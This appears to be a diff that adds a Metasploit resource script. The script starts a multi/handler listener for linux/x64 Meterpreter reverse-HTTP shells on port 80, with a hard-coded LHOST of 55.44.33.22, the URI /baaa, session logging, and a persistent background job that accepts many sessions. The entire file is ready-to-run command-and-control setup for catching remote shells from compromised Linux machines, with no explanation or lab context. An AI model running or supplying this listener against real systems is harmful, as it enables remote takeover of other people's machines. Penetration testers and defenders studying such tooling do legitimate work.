@@ -1,0 +1,15 @@
+setg ConsoleLogging true
+setg SessionLogging true
+setg LHOST 55.44.33.22
+
+use exploit/multi/handler
+
+set PAYLOAD linux/x64/meterpreter_reverse_http
+set LPORT 80
+set LURI /baaa
+
+set ExitOnSession false
+set ReverseListenerBindAddress 0.0.0.0
+exploit -j -z
+
+back
